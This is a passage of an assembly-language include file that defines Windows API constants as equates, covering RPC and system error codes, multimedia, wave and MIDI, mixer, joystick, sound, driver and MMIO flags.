RPC_S_DUPLICATE_ENDPOINT equ 1740
RPC_S_UNKNOWN_AUTHN_TYPE equ 1741
RPC_S_MAX_CALLS_TOO_SMALL equ 1742
RPC_S_STRING_TOO_LONG equ 1743
RPC_S_PROTSEQ_NOT_FOUND equ 1744
RPC_S_PROCNUM_OUT_OF_RANGE equ 1745
RPC_S_BINDING_HAS_NO_AUTH equ 1746
RPC_S_UNKNOWN_AUTHN_SERVICE equ 1747
RPC_S_UNKNOWN_AUTHN_LEVEL equ 1748
RPC_S_INVALID_AUTH_IDENTITY equ 1749
RPC_S_UNKNOWN_AUTHZ_SERVICE equ 1750
EPT_S_INVALID_ENTRY equ 1751
EPT_S_CANT_PERFORM_OP equ 1752
EPT_S_NOT_REGISTERED equ 1753
RPC_S_NOTHING_TO_EXPORT equ 1754
RPC_S_INCOMPLETE_NAME equ 1755
RPC_S_INVALID_VERS_OPTION equ 1756
RPC_S_NO_MORE_MEMBERS equ 1757
RPC_S_NOT_ALL_OBJS_UNEXPORTED equ 1758
RPC_S_INTERFACE_NOT_FOUND equ 1759
RPC_S_ENTRY_ALREADY_EXISTS equ 1760
RPC_S_ENTRY_NOT_FOUND equ 1761
RPC_S_NAME_SERVICE_UNAVAILABLE equ 1762
RPC_S_INVALID_NAF_ID equ 1763
RPC_S_CANNOT_SUPPORT equ 1764
RPC_S_NO_CONTEXT_AVAILABLE equ 1765
RPC_S_INTERNAL_ERROR equ 1766
RPC_S_ZERO_DIVIDE equ 1767
RPC_S_ADDRESS_ERROR equ 1768
RPC_S_FP_DIV_ZERO equ 1769
RPC_S_FP_UNDERFLOW equ 1770
RPC_S_FP_OVERFLOW equ 1771
RPC_X_NO_MORE_ENTRIES equ 1772
RPC_X_SS_CHAR_TRANS_OPEN_FAIL equ 1773
RPC_X_SS_CHAR_TRANS_SHORT_FILE equ 1774
RPC_X_SS_IN_NULL_CONTEXT equ 1775
RPC_X_SS_CONTEXT_DAMAGED equ 1777
RPC_X_SS_HANDLES_MISMATCH equ 1778
RPC_X_SS_CANNOT_GET_CALL_HANDLE equ 1779
RPC_X_NULL_REF_POINTER equ 1780
RPC_X_ENUM_VALUE_OUT_OF_RANGE equ 1781
RPC_X_BYTE_COUNT_TOO_SMALL equ 1782
RPC_X_BAD_STUB_DATA equ 1783
ERROR_INVALID_USER_BUFFER equ 1784
ERROR_UNRECOGNIZED_MEDIA equ 1785
ERROR_NO_TRUST_LSA_SECRET equ 1786
ERROR_NO_TRUST_SAM_ACCOUNT equ 1787
ERROR_TRUSTED_DOMAIN_FAILURE equ 1788
ERROR_TRUSTED_RELATIONSHIP_FAILURE equ 1789
ERROR_TRUST_FAILURE equ 1790
RPC_S_CALL_IN_PROGRESS equ 1791
ERROR_NETLOGON_NOT_STARTED equ 1792
ERROR_ACCOUNT_EXPIRED equ 1793
ERROR_REDIRECTOR_HAS_OPEN_HANDLES equ 1794
ERROR_PRINTER_DRIVER_ALREADY_INSTALLED equ 1795
ERROR_UNKNOWN_PORT equ 1796
ERROR_UNKNOWN_PRINTER_DRIVER equ 1797
ERROR_UNKNOWN_PRINTPROCESSOR equ 1798
ERROR_INVALID_SEPARATOR_FILE equ 1799
ERROR_INVALID_PRIORITY equ 1800
ERROR_INVALID_PRINTER_NAME equ 1801
ERROR_PRINTER_ALREADY_EXISTS equ 1802
ERROR_INVALID_PRINTER_COMMAND equ 1803
ERROR_INVALID_DATATYPE equ 1804
ERROR_INVALID_ENVIRONMENT equ 1805
RPC_S_NO_MORE_BINDINGS equ 1806
ERROR_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT equ 1807
ERROR_NOLOGON_WORKSTATION_TRUST_ACCOUNT equ 1808
ERROR_NOLOGON_SERVER_TRUST_ACCOUNT equ 1809
ERROR_DOMAIN_TRUST_INCONSISTENT equ 1810
ERROR_SERVER_HAS_OPEN_HANDLES equ 1811
ERROR_RESOURCE_DATA_NOT_FOUND equ 1812
ERROR_RESOURCE_TYPE_NOT_FOUND equ 1813
ERROR_RESOURCE_NAME_NOT_FOUND equ 1814
ERROR_RESOURCE_LANG_NOT_FOUND equ 1815
ERROR_NOT_ENOUGH_QUOTA equ 1816
RPC_S_GROUP_MEMBER_NOT_FOUND equ 1898
EPT_S_CANT_CREATE equ 1899
RPC_S_INVALID_OBJECT equ 1900
ERROR_INVALID_TIME equ 1901
ERROR_INVALID_FORM_NAME equ 1902
ERROR_INVALID_FORM_SIZE equ 1903
ERROR_ALREADY_WAITING equ 1904
ERROR_PRINTER_DELETED equ 1905
ERROR_INVALID_PRINTER_STATE equ 1906
ERROR_NO_BROWSER_SERVERS_FOUND equ 6118
MAXPNAMELEN equ 32
MAXERRORLENGTH equ 128
TIME_MS equ 1h
TIME_SAMPLES equ 2h
TIME_BYTES equ 4h
TIME_SMPTE equ 8h
TIME_MIDI equ 10h
MM_JOY1MOVE equ 3A0h
MM_JOY2MOVE equ 3A1h
MM_JOY1ZMOVE equ 3A2h
MM_JOY2ZMOVE equ 3A3h
MM_JOY1BUTTONDOWN equ 3B5h
MM_JOY2BUTTONDOWN equ 3B6h
MM_JOY1BUTTONUP equ 3B7h
MM_JOY2BUTTONUP equ 3B8h
MM_MCINOTIFY equ 3B9h
MM_MCISYSTEM_STRING equ 3CAh
MM_WOM_OPEN equ 3BBh
MM_WOM_CLOSE equ 3BCh
MM_WOM_DONE equ 3BDh
MM_WIM_OPEN equ 3BEh
MM_WIM_CLOSE equ 3BFh
MM_WIM_DATA equ 3C0h
MM_MIM_OPEN equ 3C1h
MM_MIM_CLOSE equ 3C2h
MM_MIM_DATA equ 3C3h
MM_MIM_LONGDATA equ 3C4h
MM_MIM_ERROR equ 3C5h
MM_MIM_LONGERROR equ 3C6h
MM_MOM_OPEN equ 3C7h
MM_MOM_CLOSE equ 3C8h
MM_MOM_DONE equ 3C9h
MMSYSERR_BASE equ 0
WAVERR_BASE equ 32
MIDIERR_BASE equ 64
TIMERR_BASE equ 96
JOYERR_BASE equ 160
MCIERR_BASE equ 256
MCI_STRING_OFFSET equ 512
MCI_VD_OFFSET equ 1024
MCI_CD_OFFSET equ 1088
MCI_WAVE_OFFSET equ 1152
MCI_SEQ_OFFSET equ 1216
MMSYSERR_NOERROR equ 0
MMSYSERR_ERROR equ MMSYSERR_BASE+1
MMSYSERR_BADDEVICEID equ MMSYSERR_BASE+2
MMSYSERR_NOTENABLED equ MMSYSERR_BASE+3
MMSYSERR_ALLOCATED equ MMSYSERR_BASE+4
MMSYSERR_INVALHANDLE equ MMSYSERR_BASE+5
MMSYSERR_NODRIVER equ MMSYSERR_BASE+6
MMSYSERR_NOMEM equ MMSYSERR_BASE+7
MMSYSERR_NOTSUPPORTED equ MMSYSERR_BASE+8
MMSYSERR_BADERRNUM equ MMSYSERR_BASE+9
MMSYSERR_INVALFLAG equ MMSYSERR_BASE+10
MMSYSERR_INVALPARAM equ MMSYSERR_BASE+11
MMSYSERR_HANDLEBUSY equ MMSYSERR_BASE+12
MMSYSERR_INVALIDALIAS equ MMSYSERR_BASE+13
MMSYSERR_LASTERROR equ MMSYSERR_BASE+13
MM_MOM_POSITIONCB equ 3CAh
MM_MCISIGNAL equ 3CBh
MM_MIM_MOREDATA equ 3CCh
MIDICAPS_STREAM equ 8h
MEVT_F_SHORT equ 0h
MEVT_F_LONG equ 80000000h
MEVT_F_CALLBACK equ 40000000h
MIDISTRM_ERROR equ -2
MIDIPROP_SET equ 80000000h
MIDIPROP_GET equ 40000000h
MIDIPROP_TIMEDIV equ 1h
MIDIPROP_TEMPO equ 2h
MIXER_SHORT_NAME_CHARS equ 16
MIXER_LONG_NAME_CHARS equ 64
MIXERR_BASE equ 1024
MIXERR_INVALLINE equ MIXERR_BASE+0
MIXERR_INVALCONTROL equ MIXERR_BASE+1
MIXERR_INVALVALUE equ MIXERR_BASE+2
MIXERR_LASTERROR equ MIXERR_BASE+2
MIXER_OBJECTF_HANDLE equ 80000000h
MIXER_OBJECTF_MIXER equ 0h
MIXER_OBJECTF_HMIXER equ MIXER_OBJECTF_HANDLE|MIXER_OBJECTF_MIXER
MIXER_OBJECTF_WAVEOUT equ 10000000h
MIXER_OBJECTF_HWAVEOUT equ MIXER_OBJECTF_HANDLE|MIXER_OBJECTF_WAVEOUT
MIXER_OBJECTF_WAVEIN equ 20000000h
MIXER_OBJECTF_HWAVEIN equ MIXER_OBJECTF_HANDLE|MIXER_OBJECTF_WAVEIN
MIXER_OBJECTF_MIDIOUT equ 30000000h
MIXER_OBJECTF_HMIDIOUT equ MIXER_OBJECTF_HANDLE|MIXER_OBJECTF_MIDIOUT
MIXER_OBJECTF_MIDIIN equ 40000000h
MIXER_OBJECTF_HMIDIIN equ MIXER_OBJECTF_HANDLE|MIXER_OBJECTF_MIDIIN
MIXER_OBJECTF_AUX equ 50000000h
MIXERLINE_LINEF_ACTIVE equ 1h
MIXERLINE_LINEF_DISCONNECTED equ 8000h
MIXERLINE_LINEF_SOURCE equ 80000000h
MIXERLINE_COMPONENTTYPE_DST_FIRST equ 0h
MIXERLINE_COMPONENTTYPE_DST_UNDEFINED equ MIXERLINE_COMPONENTTYPE_DST_FIRST+0
MIXERLINE_COMPONENTTYPE_DST_DIGITAL equ MIXERLINE_COMPONENTTYPE_DST_FIRST+1
MIXERLINE_COMPONENTTYPE_DST_LINE equ MIXERLINE_COMPONENTTYPE_DST_FIRST+2
MIXERLINE_COMPONENTTYPE_DST_MONITOR equ MIXERLINE_COMPONENTTYPE_DST_FIRST+3
MIXERLINE_COMPONENTTYPE_DST_SPEAKERS equ MIXERLINE_COMPONENTTYPE_DST_FIRST+4
MIXERLINE_COMPONENTTYPE_DST_HEADPHONES equ MIXERLINE_COMPONENTTYPE_DST_FIRST+5
MIXERLINE_COMPONENTTYPE_DST_TELEPHONE equ MIXERLINE_COMPONENTTYPE_DST_FIRST+6
MIXERLINE_COMPONENTTYPE_DST_WAVEIN equ MIXERLINE_COMPONENTTYPE_DST_FIRST+7
MIXERLINE_COMPONENTTYPE_DST_VOICEIN equ MIXERLINE_COMPONENTTYPE_DST_FIRST+8
MIXERLINE_COMPONENTTYPE_DST_LAST equ MIXERLINE_COMPONENTTYPE_DST_FIRST+8
MIXERLINE_COMPONENTTYPE_SRC_FIRST equ 1000h
MIXERLINE_COMPONENTTYPE_SRC_UNDEFINED equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+0
MIXERLINE_COMPONENTTYPE_SRC_DIGITAL equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+1
MIXERLINE_COMPONENTTYPE_SRC_LINE equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+2
MIXERLINE_COMPONENTTYPE_SRC_MICROPHONE equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+3
MIXERLINE_COMPONENTTYPE_SRC_SYNTHESIZER equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+4
MIXERLINE_COMPONENTTYPE_SRC_COMPACTDISC equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+5
MIXERLINE_COMPONENTTYPE_SRC_TELEPHONE equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+6
MIXERLINE_COMPONENTTYPE_SRC_PCSPEAKER equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+7
MIXERLINE_COMPONENTTYPE_SRC_WAVEOUT equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+8
MIXERLINE_COMPONENTTYPE_SRC_AUXILIARY equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+9
MIXERLINE_COMPONENTTYPE_SRC_ANALOG equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+10
MIXERLINE_COMPONENTTYPE_SRC_LAST equ MIXERLINE_COMPONENTTYPE_SRC_FIRST+10
MIXERLINE_TARGETTYPE_UNDEFINED equ 0
MIXERLINE_TARGETTYPE_WAVEOUT equ 1
MIXERLINE_TARGETTYPE_WAVEIN equ 2
MIXERLINE_TARGETTYPE_MIDIOUT equ 3
MIXERLINE_TARGETTYPE_MIDIIN equ 4
MIXERLINE_TARGETTYPE_AUX equ 5
MIXER_GETLINEINFOF_DESTINATION equ 0h
MIXER_GETLINEINFOF_SOURCE equ 1h
MIXER_GETLINEINFOF_LINEID equ 2h
MIXER_GETLINEINFOF_COMPONENTTYPE equ 3h
MIXER_GETLINEINFOF_TARGETTYPE equ 4h
MIXER_GETLINEINFOF_QUERYMASK equ 0Fh
MIXERCONTROL_CONTROLF_UNIFORM equ 1h
MIXERCONTROL_CONTROLF_MULTIPLE equ 2h
MIXERCONTROL_CONTROLF_DISABLED equ 80000000h
MIXERCONTROL_CT_CLASS_MASK equ 0F0000000h
MIXERCONTROL_CT_CLASS_CUSTOM equ 0h
MIXERCONTROL_CT_CLASS_METER equ 10000000h
MIXERCONTROL_CT_CLASS_SWITCH equ 20000000h
MIXERCONTROL_CT_CLASS_NUMBER equ 30000000h
MIXERCONTROL_CT_CLASS_SLIDER equ 40000000h
MIXERCONTROL_CT_CLASS_FADER equ 50000000h
MIXERCONTROL_CT_CLASS_TIME equ 60000000h
MIXERCONTROL_CT_CLASS_LIST equ 70000000h
MIXERCONTROL_CT_SUBCLASS_MASK equ 0F000000h
MIXERCONTROL_CT_SC_SWITCH_BOOLEAN equ 0h
MIXERCONTROL_CT_SC_SWITCH_BUTTON equ 1000000h
MIXERCONTROL_CT_SC_METER_POLLED equ 0h
MIXERCONTROL_CT_SC_TIME_MICROSECS equ 0h
MIXERCONTROL_CT_SC_TIME_MILLISECS equ 1000000h
MIXERCONTROL_CT_SC_LIST_SINGLE equ 0h
MIXERCONTROL_CT_SC_LIST_MULTIPLE equ 1000000h
MIXERCONTROL_CT_UNITS_MASK equ 0FF0000h
MIXERCONTROL_CT_UNITS_CUSTOM equ 0h
MIXERCONTROL_CT_UNITS_BOOLEAN equ 10000h
MIXERCONTROL_CT_UNITS_SIGNED equ 20000h
MIXERCONTROL_CT_UNITS_UNSIGNED equ 30000h
MIXERCONTROL_CT_UNITS_DECIBELS equ 40000h
MIXERCONTROL_CT_UNITS_PERCENT equ 50000h
MIXERCONTROL_CONTROLTYPE_CUSTOM equ MIXERCONTROL_CT_CLASS_CUSTOM|MIXERCONTROL_CT_UNITS_CUSTOM
MIXERCONTROL_CONTROLTYPE_BOOLEANMETER equ MIXERCONTROL_CT_CLASS_METER|MIXERCONTROL_CT_SC_METER_POLLED|MIXERCONTROL_CT_UNITS_BOOLEAN
MIXERCONTROL_CONTROLTYPE_SIGNEDMETER equ MIXERCONTROL_CT_CLASS_METER|MIXERCONTROL_CT_SC_METER_POLLED|MIXERCONTROL_CT_UNITS_SIGNED
MIXERCONTROL_CONTROLTYPE_PEAKMETER equ MIXERCONTROL_CONTROLTYPE_SIGNEDMETER+1
MIXERCONTROL_CONTROLTYPE_UNSIGNEDMETER equ MIXERCONTROL_CT_CLASS_METER|MIXERCONTROL_CT_SC_METER_POLLED|MIXERCONTROL_CT_UNITS_UNSIGNED
MIXERCONTROL_CONTROLTYPE_BOOLEAN equ MIXERCONTROL_CT_CLASS_SWITCH|MIXERCONTROL_CT_SC_SWITCH_BOOLEAN|MIXERCONTROL_CT_UNITS_BOOLEAN
MIXERCONTROL_CONTROLTYPE_ONOFF equ MIXERCONTROL_CONTROLTYPE_BOOLEAN+1
MIXERCONTROL_CONTROLTYPE_MUTE equ MIXERCONTROL_CONTROLTYPE_BOOLEAN+2
MIXERCONTROL_CONTROLTYPE_MONO equ MIXERCONTROL_CONTROLTYPE_BOOLEAN+3
MIXERCONTROL_CONTROLTYPE_LOUDNESS equ MIXERCONTROL_CONTROLTYPE_BOOLEAN+4
MIXERCONTROL_CONTROLTYPE_STEREOENH equ MIXERCONTROL_CONTROLTYPE_BOOLEAN+5
MIXERCONTROL_CONTROLTYPE_BUTTON equ MIXERCONTROL_CT_CLASS_SWITCH|MIXERCONTROL_CT_SC_SWITCH_BUTTON|MIXERCONTROL_CT_UNITS_BOOLEAN
MIXERCONTROL_CONTROLTYPE_DECIBELS equ MIXERCONTROL_CT_CLASS_NUMBER|MIXERCONTROL_CT_UNITS_DECIBELS
MIXERCONTROL_CONTROLTYPE_SIGNED equ MIXERCONTROL_CT_CLASS_NUMBER|MIXERCONTROL_CT_UNITS_SIGNED
MIXERCONTROL_CONTROLTYPE_UNSIGNED equ MIXERCONTROL_CT_CLASS_NUMBER|MIXERCONTROL_CT_UNITS_UNSIGNED
MIXERCONTROL_CONTROLTYPE_PERCENT equ MIXERCONTROL_CT_CLASS_NUMBER|MIXERCONTROL_CT_UNITS_PERCENT
MIXERCONTROL_CONTROLTYPE_SLIDER equ MIXERCONTROL_CT_CLASS_SLIDER|MIXERCONTROL_CT_UNITS_SIGNED
MIXERCONTROL_CONTROLTYPE_PAN equ MIXERCONTROL_CONTROLTYPE_SLIDER+1
MIXERCONTROL_CONTROLTYPE_QSOUNDPAN equ MIXERCONTROL_CONTROLTYPE_SLIDER+2
MIXERCONTROL_CONTROLTYPE_FADER equ MIXERCONTROL_CT_CLASS_FADER|MIXERCONTROL_CT_UNITS_UNSIGNED
MIXERCONTROL_CONTROLTYPE_VOLUME equ MIXERCONTROL_CONTROLTYPE_FADER+1
MIXERCONTROL_CONTROLTYPE_BASS equ MIXERCONTROL_CONTROLTYPE_FADER+2
MIXERCONTROL_CONTROLTYPE_TREBLE equ MIXERCONTROL_CONTROLTYPE_FADER+3
MIXERCONTROL_CONTROLTYPE_EQUALIZER equ MIXERCONTROL_CONTROLTYPE_FADER+4
MIXERCONTROL_CONTROLTYPE_SINGLESELECT equ MIXERCONTROL_CT_CLASS_LIST|MIXERCONTROL_CT_SC_LIST_SINGLE|MIXERCONTROL_CT_UNITS_BOOLEAN
MIXERCONTROL_CONTROLTYPE_MUX equ MIXERCONTROL_CONTROLTYPE_SINGLESELECT+1
MIXERCONTROL_CONTROLTYPE_MULTIPLESELECT equ MIXERCONTROL_CT_CLASS_LIST|MIXERCONTROL_CT_SC_LIST_MULTIPLE|MIXERCONTROL_CT_UNITS_BOOLEAN
MIXERCONTROL_CONTROLTYPE_MIXER equ MIXERCONTROL_CONTROLTYPE_MULTIPLESELECT+1
MIXERCONTROL_CONTROLTYPE_MICROTIME equ MIXERCONTROL_CT_CLASS_TIME|MIXERCONTROL_CT_SC_TIME_MICROSECS|MIXERCONTROL_CT_UNITS_UNSIGNED
MIXERCONTROL_CONTROLTYPE_MILLITIME equ MIXERCONTROL_CT_CLASS_TIME|MIXERCONTROL_CT_SC_TIME_MILLISECS|MIXERCONTROL_CT_UNITS_UNSIGNED
MIXER_GETLINECONTROLSF_ALL equ 0h
MIXER_GETLINECONTROLSF_ONEBYID equ 1h
MIXER_GETLINECONTROLSF_ONEBYTYPE equ 2h
MIXER_GETLINECONTROLSF_QUERYMASK equ 0Fh
MIXER_GETCONTROLDETAILSF_VALUE equ 0h
MIXER_GETCONTROLDETAILSF_LISTTEXT equ 1h
MIXER_GETCONTROLDETAILSF_QUERYMASK equ 0Fh
MIXER_SETCONTROLDETAILSF_VALUE equ 0h
MIXER_SETCONTROLDETAILSF_CUSTOM equ 1h
MIXER_SETCONTROLDETAILSF_QUERYMASK equ 0Fh
JOY_BUTTON5 equ 10h
JOY_BUTTON6 equ 20h
JOY_BUTTON7 equ 40h
JOY_BUTTON8 equ 80h
JOY_BUTTON9 equ 100h
JOY_BUTTON10 equ 200h
JOY_BUTTON11 equ 400h
JOY_BUTTON12 equ 800h
JOY_BUTTON13 equ 1000h
JOY_BUTTON14 equ 2000h
JOY_BUTTON15 equ 4000h
JOY_BUTTON16 equ 8000h
JOY_BUTTON17 equ 10000h
JOY_BUTTON18 equ 20000h
JOY_BUTTON19 equ 40000h
JOY_BUTTON20 equ 80000h
JOY_BUTTON21 equ 100000h
JOY_BUTTON22 equ 200000h
JOY_BUTTON23 equ 400000h
JOY_BUTTON24 equ 800000h
JOY_BUTTON25 equ 1000000h
JOY_BUTTON26 equ 2000000h
JOY_BUTTON27 equ 4000000h
JOY_BUTTON28 equ 8000000h
JOY_BUTTON29 equ 10000000h
JOY_BUTTON30 equ 20000000h
JOY_BUTTON31 equ 40000000h
JOY_BUTTON32 equ 80000000h
JOY_POVCENTERED equ -1
JOY_POVFORWARD equ 0
JOY_POVRIGHT equ 9000
JOY_POVBACKWARD equ 18000
JOY_POVLEFT equ 27000
JOY_RETURNX equ 1h
JOY_RETURNY equ 2h
JOY_RETURNZ equ 4h
JOY_RETURNR equ 8h
JOY_RETURNU equ 10h
JOY_RETURNV equ 20h
JOY_RETURNPOV equ 40h
JOY_RETURNBUTTONS equ 80h
JOY_RETURNRAWDATA equ 100h
JOY_RETURNPOVCTS equ 200h
JOY_RETURNCENTERED equ 400h
JOY_USEDEADZONE equ 800h
JOY_RETURNALL equ JOY_RETURNX|JOY_RETURNY|JOY_RETURNZ|JOY_RETURNR|JOY_RETURNU|JOY_RETURNV|JOY_RETURNPOV|JOY_RETURNBUTTONS
JOY_CAL_READALWAYS equ 10000h
JOY_CAL_READXYONLY equ 20000h
JOY_CAL_READ3 equ 40000h
JOY_CAL_READ4 equ 80000h
JOY_CAL_READXONLY equ 100000h
JOY_CAL_READYONLY equ 200000h
JOY_CAL_READ5 equ 400000h
JOY_CAL_READ6 equ 800000h
JOY_CAL_READZONLY equ 1000000h
JOY_CAL_READRONLY equ 2000000h
JOY_CAL_READUONLY equ 4000000h
JOY_CAL_READVONLY equ 8000000h
WAVE_FORMAT_QUERY equ 1h
SND_PURGE equ 40h
SND_APPLICATION equ 80h
WAVE_MAPPED equ 4h
WAVE_FORMAT_DIRECT equ 8h
WAVE_FORMAT_DIRECT_QUERY equ WAVE_FORMAT_QUERY|WAVE_FORMAT_DIRECT
MIM_MOREDATA equ MM_MIM_MOREDATA
MOM_POSITIONCB equ MM_MOM_POSITIONCB
MIDI_IO_STATUS equ 20h
DRV_LOAD equ 1h
DRV_ENABLE equ 2h
DRV_OPEN equ 3h
DRV_CLOSE equ 4h
DRV_DISABLE equ 5h
DRV_FREE equ 6h
DRV_CONFIGURE equ 7h
DRV_QUERYCONFIGURE equ 8h
DRV_INSTALL equ 9h
DRV_REMOVE equ 0Ah
DRV_EXITSESSION equ 0Bh
DRV_POWER equ 0Fh
DRV_RESERVED equ 800h
DRV_USER equ 4000h
DRVCNF_CANCEL equ 0h
DRVCNF_OK equ 1h
DRVCNF_RESTART equ 2h
DRV_CANCEL equ DRVCNF_CANCEL
DRV_OK equ DRVCNF_OK
DRV_RESTART equ DRVCNF_RESTART
DRV_MCI_FIRST equ DRV_RESERVED
DRV_MCI_LAST equ DRV_RESERVED+0FFFh
CALLBACK_TYPEMASK equ 70000h
CALLBACK_NULL equ 0h
CALLBACK_WINDOW equ 10000h
CALLBACK_TASK equ 20000h
CALLBACK_FUNCTION equ 30000h
MM_MICROSOFT equ 1
MM_MIDI_MAPPER equ 1
MM_WAVE_MAPPER equ 2
MM_SNDBLST_MIDIOUT equ 3
MM_SNDBLST_MIDIIN equ 4
MM_SNDBLST_SYNTH equ 5
MM_SNDBLST_WAVEOUT equ 6
MM_SNDBLST_WAVEIN equ 7
MM_ADLIB equ 9
MM_MPU401_MIDIOUT equ 10
MM_MPU401_MIDIIN equ 11
MM_PC_JOYSTICK equ 12
SND_SYNC equ 0h
SND_ASYNC equ 1h
SND_NODEFAULT equ 2h
SND_MEMORY equ 4h
SND_ALIAS equ 10000h
SND_FILENAME equ 20000h
SND_RESOURCE equ 40004h
SND_ALIAS_ID equ 110000h
SND_ALIAS_START equ 0
SND_LOOP equ 8h
SND_NOSTOP equ 10h
SND_VALID equ 1Fh
SND_NOWAIT equ 2000h
SND_VALIDFLAGS equ 17201Fh
SND_RESERVED equ 0FF000000h
SND_TYPE_MASK equ 170007h
WAVERR_BADFORMAT equ WAVERR_BASE+0
WAVERR_STILLPLAYING equ WAVERR_BASE+1
WAVERR_UNPREPARED equ WAVERR_BASE+2
WAVERR_SYNC equ WAVERR_BASE+3
WAVERR_LASTERROR equ WAVERR_BASE+3
WOM_OPEN equ MM_WOM_OPEN
WOM_CLOSE equ MM_WOM_CLOSE
WOM_DONE equ MM_WOM_DONE
WIM_OPEN equ MM_WIM_OPEN
WIM_CLOSE equ MM_WIM_CLOSE
WIM_DATA equ MM_WIM_DATA
WAVE_MAPPER equ -1
WAVE_ALLOWSYNC equ 2h
WAVE_VALID equ 3h
WHDR_DONE equ 1h
WHDR_PREPARED equ 2h
WHDR_BEGINLOOP equ 4h
WHDR_ENDLOOP equ 8h
WHDR_INQUEUE equ 10h
WHDR_VALID equ 1Fh
WAVECAPS_PITCH equ 1h
WAVECAPS_PLAYBACKRATE equ 2h
WAVECAPS_VOLUME equ 4h
WAVECAPS_LRVOLUME equ 8h
WAVECAPS_SYNC equ 10h
WAVE_INVALIDFORMAT equ 0h
WAVE_FORMAT_1M08 equ 1h
WAVE_FORMAT_1S08 equ 2h
WAVE_FORMAT_1M16 equ 4h
WAVE_FORMAT_1S16 equ 8h
WAVE_FORMAT_2M08 equ 10h
WAVE_FORMAT_2S08 equ 20h
WAVE_FORMAT_2M16 equ 40h
WAVE_FORMAT_2S16 equ 80h
WAVE_FORMAT_4M08 equ 100h
WAVE_FORMAT_4S08 equ 200h
WAVE_FORMAT_4M16 equ 400h
WAVE_FORMAT_4S16 equ 800h
WAVE_FORMAT_PCM equ 1
MIDIERR_UNPREPARED equ MIDIERR_BASE+0
MIDIERR_STILLPLAYING equ MIDIERR_BASE+1
MIDIERR_NOMAP equ MIDIERR_BASE+2
MIDIERR_NOTREADY equ MIDIERR_BASE+3
MIDIERR_NODEVICE equ MIDIERR_BASE+4
MIDIERR_INVALIDSETUP equ MIDIERR_BASE+5
MIDIERR_LASTERROR equ MIDIERR_BASE+5
MIM_OPEN equ MM_MIM_OPEN
MIM_CLOSE equ MM_MIM_CLOSE
MIM_DATA equ MM_MIM_DATA
MIM_LONGDATA equ MM_MIM_LONGDATA
MIM_ERROR equ MM_MIM_ERROR
MIM_LONGERROR equ MM_MIM_LONGERROR
MOM_OPEN equ MM_MOM_OPEN
MOM_CLOSE equ MM_MOM_CLOSE
MOM_DONE equ MM_MOM_DONE
MIDIMAPPER equ -1
MIDI_MAPPER equ -1
MIDI_CACHE_ALL equ 1
MIDI_CACHE_BESTFIT equ 2
MIDI_CACHE_QUERY equ 3
MIDI_UNCACHE equ 4
MIDI_CACHE_VALID equ MIDI_CACHE_ALL|MIDI_CACHE_BESTFIT|MIDI_CACHE_QUERY|MIDI_UNCACHE
MOD_MIDIPORT equ 1
MOD_SYNTH equ 2
MOD_SQSYNTH equ 3
MOD_FMSYNTH equ 4
MOD_MAPPER equ 5
MIDICAPS_VOLUME equ 1h
MIDICAPS_LRVOLUME equ 2h
MIDICAPS_CACHE equ 4h
MHDR_DONE equ 1h
MHDR_PREPARED equ 2h
MHDR_INQUEUE equ 4h
MHDR_VALID equ 7h
AUX_MAPPER equ -1
AUXCAPS_CDAUDIO equ 1
AUXCAPS_AUXIN equ 2
AUXCAPS_VOLUME equ 1h
AUXCAPS_LRVOLUME equ 2h
TIMERR_NOERROR equ 0
TIMERR_NOCANDO equ TIMERR_BASE+1
TIMERR_STRUCT equ TIMERR_BASE+33
TIME_ONESHOT equ 0
TIME_PERIODIC equ 1
JOYERR_NOERROR equ 0
JOYERR_PARMS equ JOYERR_BASE+5
JOYERR_NOCANDO equ JOYERR_BASE+6
JOYERR_UNPLUGGED equ JOYERR_BASE+7
JOY_BUTTON1 equ 1h
JOY_BUTTON2 equ 2h
JOY_BUTTON3 equ 4h
JOY_BUTTON4 equ 8h
JOY_BUTTON1CHG equ 100h
JOY_BUTTON2CHG equ 200h
JOY_BUTTON3CHG equ 400h
JOY_BUTTON4CHG equ 800h
JOYSTICKID1 equ 0
JOYSTICKID2 equ 1
MMIOERR_BASE equ 256
MMIOERR_FILENOTFOUND equ MMIOERR_BASE+1
MMIOERR_OUTOFMEMORY equ MMIOERR_BASE+2
MMIOERR_CANNOTOPEN equ MMIOERR_BASE+3
MMIOERR_CANNOTCLOSE equ MMIOERR_BASE+4
MMIOERR_CANNOTREAD equ MMIOERR_BASE+5
MMIOERR_CANNOTWRITE equ MMIOERR_BASE+6
MMIOERR_CANNOTSEEK equ MMIOERR_BASE+7
MMIOERR_CANNOTEXPAND equ MMIOERR_BASE+8
MMIOERR_CHUNKNOTFOUND equ MMIOERR_BASE+9
MMIOERR_UNBUFFERED equ MMIOERR_BASE+10
MMIO_RWMODE equ 3h
MMIO_SHAREMODE equ 70h
MMIO_CREATE equ 1000h
MMIO_PARSE equ 100h
MMIO_DELETE equ 200h
MMIO_EXIST equ 4000h
MMIO_ALLOCBUF equ 10000h
MMIO_GETTEMP equ 20000h
MMIO_DIRTY equ 10000000h
MMIO_OPEN_VALID equ 3FFFFh
MMIO_READ equ 0h
MMIO_WRITE equ 1h
MMIO_READWRITE equ 2h
MMIO_COMPAT equ 0h
MMIO_EXCLUSIVE equ 10h
MMIO_DENYWRITE equ 20h
MMIO_DENYREAD equ 30h
MMIO_DENYNONE equ 40h
MMIO_FHOPEN equ 10h
MMIO_EMPTYBUF equ 10h
MMIO_TOUPPER equ 10h
MMIO_INSTALLPROC equ 10000h
MMIO_PUBLICPROC equ 10000000h
MMIO_UNICODEPROC equ 1000000h
MMIO_REMOVEPROC equ 20000h
MMIO_FINDPROC equ 40000h
MMIO_FINDCHUNK equ 10h
MMIO_FINDRIFF equ 20h
MMIO_FINDLIST equ 40h
MMIO_CREATERIFF equ 20h
MMIO_CREATELIST equ 40h
MMIO_VALIDPROC equ 11070000h
MMIOM_READ equ MMIO_READ
MMIOM_WRITE equ MMIO_WRITE
MMIOM_SEEK equ 2
MMIOM_OPEN equ 3
MMIOM_CLOSE equ 4
MMIOM_WRITEFLUSH equ 5
